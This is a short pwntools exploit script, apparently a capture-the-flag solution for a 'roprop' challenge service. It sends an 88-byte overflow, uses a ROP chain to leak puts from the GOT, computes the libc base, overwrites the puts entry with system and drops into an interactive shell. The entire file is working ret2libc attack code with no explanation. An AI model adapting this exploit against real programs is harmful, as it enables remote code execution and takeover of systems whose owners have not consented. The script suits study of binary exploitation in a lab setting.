from pwn import *

context.arch = "amd64"

#p = process( './roprop' )
p = remote( 'roprop.darkarmy.xyz', 5002 )

libc = ELF( '/lib/x86_64-linux-gnu/libc.so.6' )

payload = b'a' * 88

puts_got = 0x0000000000601018
puts_plt = 0x0000000000400660
gets_plt = 0x00000000004006a0

pop_rdi = 0x0000000000400963
main = 0x00000000004008b2

rop1 = flat( [ pop_rdi, puts_got, puts_plt, main ] )

p.recvuntil( "19's.\n" )

#raw_input()
p.sendline( payload + rop1 )
p.recvuntil( '\n' )
puts_add = u64( p.recv(6).ljust( 8, b'\x00' ) )
info( "puts address: {}".format( hex( puts_add ) ) )

system_off = 0x000000000004f4e0
puts_off = 0x0000000000080a30
libc_base = puts_add - puts_off
system_add = libc_base + system_off
sh = 0x128b9 + libc_base

info( "libc base: {}".format( hex( libc_base ) ) )

rop2 = flat( [ pop_rdi, puts_got, gets_plt, pop_rdi, sh, puts_plt ] )

p.sendline( payload + rop2 )

p.sendline( p64( system_add ).ljust( 8, b'\x00' ) )

p.interactive()
